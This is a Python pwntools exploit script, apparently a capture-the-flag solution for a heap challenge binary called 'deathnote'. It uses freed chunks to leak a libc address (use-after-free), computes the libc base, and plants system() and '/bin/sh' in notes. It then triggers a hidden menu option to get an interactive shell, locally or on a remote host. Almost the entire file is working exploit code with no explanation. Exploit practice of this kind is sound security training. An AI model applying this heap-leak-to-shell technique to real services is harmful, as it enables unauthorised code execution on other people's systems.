#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('deathnote')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


fancy = '💀'.encode('utf-8')

def add(data, idx, size):
    io.sendlineafter(fancy, b"1")
    io.sendlineafter(fancy, str(size).encode())
    io.sendlineafter(fancy, str(idx).encode())
    io.sendlineafter(fancy, data)


def delete(idx):
    io.sendlineafter(fancy, b"2")
    io.sendlineafter(fancy, str(idx).encode())


def show(idx):
    io.sendlineafter(fancy, b"3")
    io.sendlineafter(fancy, str(idx).encode())


def backdoor():
    io.sendlineafter(fancy, b"42")


def solve():
   
    for i in range(9):
        add(b'A', i, 0x80)
  
    for i in range(8, 0, -1):
        delete(i - 1)
    
    show(0)

    io.recvuntil(b"content: ")
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = int(hex(leak), 16) - 0x21ace0
    info("libc base: %#x", libc.address)

    system = hex(libc.sym['system'])
    sh = b'/bin/sh\x00'

    add(system[2:], 0, 32)
    add(sh, 1, 32)
# 
    backdoor()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

